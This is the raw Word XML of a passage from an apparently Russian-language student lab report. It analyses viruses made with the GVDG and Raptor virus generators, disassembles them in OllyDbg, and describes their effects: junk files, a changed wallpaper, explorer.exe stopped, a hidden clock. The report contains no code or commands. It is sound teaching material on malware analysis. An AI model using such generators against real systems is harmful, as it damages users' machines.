          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:t xml:space="preserve">рисунке </w:t>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>17</w:t>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> можно увидеть блок-схему работы вируса.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C9B313" w14:textId="77777777" w:rsidR="00036C68" w:rsidRDefault="00036C68" w:rsidP="004E5FC2">
      <w:pPr>
        <w:keepNext/>
        <w:suppressAutoHyphens/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia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8C6C5A5" wp14:editId="13D68080">
            <wp:simplePos x="1664970" y="6454775"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4046400" cy="17604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00" cy="17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5055D" w14:textId="761E8C82" w:rsidR="00A43AF9" w:rsidRDefault="00036C68" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="8107"/>
        </w:tabs>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1981" w:firstLine="143"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:bookmarkStart w:id="15" w:name="_Ref102663728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14</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="15"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BF3DB4">
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Протокол работы вируса</w:t>
      </w:r>
      <w:r w:rsidR="00A43AF9">
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EF1774A" w14:textId="707A486B" w:rsidR="002C64B8" w:rsidRDefault="002C64B8" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="8107"/>
        </w:tabs>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E391859" w14:textId="4B418145" w:rsidR="002C64B8" w:rsidRPr="002C64B8" w:rsidRDefault="002C64B8" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="8107"/>
        </w:tabs>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">С помощью программы </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ollyDBG</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002C64B8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>код зараженного файла был дизассемблирован.</w:t>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:t xml:space="preserve"> На рисунках</w:t>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:instrText xml:space="preserve"> REF _Ref102677014 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>15</w:t>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:t xml:space="preserve"> и</w:t>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:instrText xml:space="preserve"> REF _Ref102677017 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:t xml:space="preserve"> можно увидеть результаты работы дизассемблера.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A844105" w14:textId="77777777" w:rsidR="00A43AF9" w:rsidRDefault="00A43AF9" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:keepNext/>
        <w:tabs>
          <w:tab w:val="left" w:pos="8107"/>
        </w:tabs>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1416" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia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47B75D73" wp14:editId="2C54DA25">
            <wp:simplePos x="1621790" y="2503170"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>302260</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4402800" cy="1922400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E570B" w14:textId="15EDB737" w:rsidR="00A43AF9" w:rsidRDefault="00A43AF9" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1981"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="_Ref102677014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15</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="16"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BF3DB4">
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Изменение реестра</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1541A539" w14:textId="13A77EA2" w:rsidR="00D67417" w:rsidRDefault="00D67417" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">       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5343F96" wp14:editId="08892D49">
            <wp:simplePos x="1567180" y="4865370"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>3810</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4359600" cy="1728000"/>
            <wp:effectExtent l="0" t="0" r="3175" b="571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6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E211D" w14:textId="52E7ECD1" w:rsidR="00D67417" w:rsidRDefault="00D67417" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">              </w:t>
      </w:r>
      <w:bookmarkStart w:id="17" w:name="_Ref102677017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16</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="17"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BF3DB4">
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Отключение часов на панели задач</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D8A85B" w14:textId="77777777" w:rsidR="002C64B8" w:rsidRDefault="002C64B8" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1981"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia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ED67784" wp14:editId="52EBCB69">
            <wp:simplePos x="2514600" y="718457"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="2642400" cy="440280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59E82" w14:textId="280B4AED" w:rsidR="00D67417" w:rsidRDefault="002C64B8" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1981" w:firstLine="143"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:bookmarkStart w:id="18" w:name="_Ref102677119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 w:rsidR="004F230A">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>17</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="18"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BF3DB4">
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Блок-схема работы вируса</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0B9827" w14:textId="77777777" w:rsidR="002C64B8" w:rsidRPr="00036C68" w:rsidRDefault="002C64B8" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5615E3FE" w14:textId="77777777" w:rsidR="00AE1FDE" w:rsidRPr="00C93DCC" w:rsidRDefault="00AE1FDE" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Тестирование и результаты </w:t>
      </w:r>
      <w:r w:rsidR="005F5D88">
        <w:t>работы программы</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D86B61" w14:textId="2B090E48" w:rsidR="00AE1FDE" w:rsidRDefault="00900A6C" w:rsidP="004E5FC2">
      <w:pPr>
        <w:suppressAutoHyphens/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">При работе вируса, созданного в генераторе </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>GVDG</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> сработали все деструктивные функции. Для наглядности на </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> REF _Ref102681978 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">рисунке </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> можно увидеть множество созданных вирусом мусорных файлов.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E5E8F21" w14:textId="5EACD17B" w:rsidR="003402F7" w:rsidRDefault="00900A6C" w:rsidP="004E5FC2">
      <w:pPr>
        <w:keepNext/>
        <w:suppressAutoHyphens/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">При работе вируса, созданного в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Raptor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Generator</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, также сработали все деструктивные функции</w:t>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">: изменились обои, прекратила работу программа </w:t>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>explorer</w:t>
      </w:r>
      <w:r w:rsidR="004F230A" w:rsidRPr="004F230A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>exe</w:t>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, исчезли часы. Результат можно увидеть на рисунках</w:t>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref102682359 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>18</w:t>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="003402F7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref102682361 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>19</w:t>
      </w:r>
      <w:r w:rsidR="004F230A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="003402F7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E6E6FC" w14:textId="21E0F688" w:rsidR="004F230A" w:rsidRDefault="004F230A" w:rsidP="004E5FC2">
      <w:pPr>
        <w:keepNext/>
        <w:suppressAutoHyphens/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251674624" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="59FF610D" wp14:editId="669D4E1A">
            <wp:simplePos x="1262743" y="1643743"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>3810</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5238000" cy="2912400"/>
            <wp:effectExtent l="0" t="0" r="1270" b="254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7184" w14:textId="01C8AE55" w:rsidR="00900A6C" w:rsidRPr="004F230A" w:rsidRDefault="004F230A" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="565" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="19" w:name="_Ref102682359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>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>18</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BF3DB4">
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Смена обоев рабочего стола и прекращение работы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>explorer</w:t>
      </w:r>
      <w:r w:rsidRPr="004F230A">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E7BDA8E" w14:textId="77777777" w:rsidR="004F230A" w:rsidRDefault="004F230A" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/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00BEB04D" wp14:editId="1DAB8409">
            <wp:simplePos x="1262743" y="5301343"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>3810</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5126400" cy="2887200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00" cy="2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2B77F" w14:textId="42CBBA43" w:rsidR="004F230A" w:rsidRPr="004F230A" w:rsidRDefault="004F230A" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1981" w:firstLine="143"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkStart w:id="20" w:name="_Ref102682361"/>
      <w:r>
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:instrText xml:space="preserve"> SEQ Рисунок \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>19</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="20"/>
      <w:r w:rsidRPr="004F230A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BF3DB4">
        <w:t>–</w:t>
      </w:r>
      <w:r w:rsidRPr="004F230A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Отсутствие часов на панели задач</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="299C357E" w14:textId="4BEAB589" w:rsidR="00C93DCC" w:rsidRDefault="00C93DCC" w:rsidP="004E5FC2">
      <w:pPr>
        <w:suppressAutoHyphens/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="064334F8" w14:textId="77777777" w:rsidR="003402F7" w:rsidRDefault="003402F7" w:rsidP="004E5FC2">
      <w:pPr>
        <w:suppressAutoHyphens/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68BCE0A9" w14:textId="77777777" w:rsidR="00C93DCC" w:rsidRPr="00C93DCC" w:rsidRDefault="00C93DCC" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Выводы</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1770B6A5" w14:textId="0E9CE337" w:rsidR="003402F7" w:rsidRDefault="003402F7" w:rsidP="004E5FC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В ходе выполнения работы были получены навыки создания вредоносных программ, работы с различными утилитами, позволяющими отслеживать действия программы, работы с дизассемблером. Был изучен принцип работы генераторов вирусов, сгенерированы вирусы</w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> исследова</w:t>
      </w:r>
      <w:r w:rsidR="003365E7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>н</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> код зараженных программ</w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>, сделан вывод о способах внедрения вирусов в файлы-жертвы.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="764183EC" w14:textId="5A1B9FA6" w:rsidR="00AE1FDE" w:rsidRDefault="00AE1FDE" w:rsidP="004E5FC2">
      <w:pPr>
        <w:suppressAutoHyphens/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="517161CB" w14:textId="77777777" w:rsidR="00D740EB" w:rsidRDefault="00D740EB" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afb"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
      <w:bookmarkStart w:id="21" w:name="_Toc35945237"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Список используемых </w:t>
      </w:r>
      <w:r w:rsidRPr="00111FF9">
        <w:t>источников</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w14:paraId="6E08CBA6" w14:textId="384369EE" w:rsidR="00D740EB" w:rsidRDefault="00F31AD1" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="a4"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:ind w:left="0" w:firstLine="851"/>
      </w:pPr>
      <w:r>
        <w:t>М</w:t>
      </w:r>
      <w:r w:rsidRPr="00F31AD1">
        <w:t>етоды обнаружения вирусов</w:t>
      </w:r>
      <w:r w:rsidR="00C94588" w:rsidRPr="00C94588">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C94588" w:rsidRPr="00A64D35">
        <w:t>[Электронный ресурс]</w:t>
      </w:r>
      <w:r w:rsidR="00C94588">
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="00C94588" w:rsidRPr="00A64D35">
        <w:t xml:space="preserve">Режим </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00C94588" w:rsidRPr="00A64D35">
        <w:t xml:space="preserve">доступа: </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F31AD1">
        <w:t>http://sumk.ulstu.ru/docs/mszki/Zavgorodnii/10.5.1</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00C94588" w:rsidRPr="00A64D35">
        <w:t>, свободный.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D43A94E" w14:textId="6B7DAFDA" w:rsidR="00C94588" w:rsidRPr="00C94588" w:rsidRDefault="00C94588" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="a4"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:ind w:left="0" w:firstLine="851"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Зегжда</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> П.Д. Основы информационной безопасности. Введение в профессиональную деятельность. Лабораторный </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">практикум </w:t>
      </w:r>
      <w:r w:rsidRPr="00C16B8F">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C16B8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учеб. пособие </w:t>
      </w:r>
      <w:r w:rsidRPr="00C16B8F">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> П. Д. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Зегжда</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
